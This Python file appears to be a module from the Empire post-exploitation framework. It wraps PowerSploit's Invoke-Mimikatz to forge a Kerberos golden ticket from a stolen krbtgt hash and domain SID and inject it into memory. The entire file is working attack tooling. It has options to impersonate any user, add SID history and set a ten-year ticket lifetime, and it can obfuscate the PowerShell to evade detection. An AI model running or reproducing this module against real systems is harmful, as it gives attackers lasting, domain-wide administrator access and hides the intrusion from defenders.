from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-Mimikatz Golden Ticket',

            'Author': ['@JosephBialek', '@gentilkiwi'],

            'Description': ("Runs PowerSploit's Invoke-Mimikatz function "
                            "to generate a golden ticket and inject it into memory."),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'http://clymb3r.wordpress.com/',
                'http://blog.gentilkiwi.com',
                "https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos"
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'CredID' : {
                'Description'   :   'CredID from the store to use for ticket creation.',
                'Required'      :   False,
                'Value'         :   ''                
            },
            'user' : {
                'Description'   :   'Username to impersonate.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'domain' : {
                'Description'   :   'The fully qualified domain name.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'sid' : {
                'Description'   :   'The SID of the specified domain.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'sids' : {
                'Description'   :   'External SIDs to add as sidhistory to the ticket.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'id' : {
                'Description'   :   'id to impersonate, defaults to 500.',
                'Required'      :   False,
                'Value'         :   ''
            },            
            'krbtgt' : {
                'Description'   :   'krbtgt NTLM hash for the specified domain',
                'Required'      :   False,
                'Value'         :   ''
            },
            'groups' : {
                'Description'   :   'Optional comma separated group IDs for the ticket.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'endin' : {
                'Description'   :   'Lifetime of the ticket (in minutes). Default to 10 years.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        # if a credential ID is specified, try to parse
        credID = self.options["CredID"]['Value']
        if credID != "":
            
            if not self.mainMenu.credentials.is_credential_valid(credID):
                print helpers.color("[!] CredID is invalid!")
                return ""

            (credID, credType, domainName, userName, password, host, os, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]
            if userName != "krbtgt":
                print helpers.color("[!] A krbtgt account must be used")
                return ""

            if domainName != "":
                self.options["domain"]['Value'] = domainName
            if sid != "":
                self.options["sid"]['Value'] = sid
            if password != "":
                self.options["krbtgt"]['Value'] = password


        if self.options["krbtgt"]['Value'] == "":
            print helpers.color("[!] krbtgt hash not specified")

        # build the golden ticket command        
        scriptEnd = "Invoke-Mimikatz -Command '\"kerberos::golden"

        for option,values in self.options.iteritems():
            if option.lower() != "agent" and option.lower() != "credid":
                if values['Value'] and values['Value'] != '':
                    scriptEnd += " /" + str(option) + ":" + str(values['Value']) 

        scriptEnd += " /ptt\"'"
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
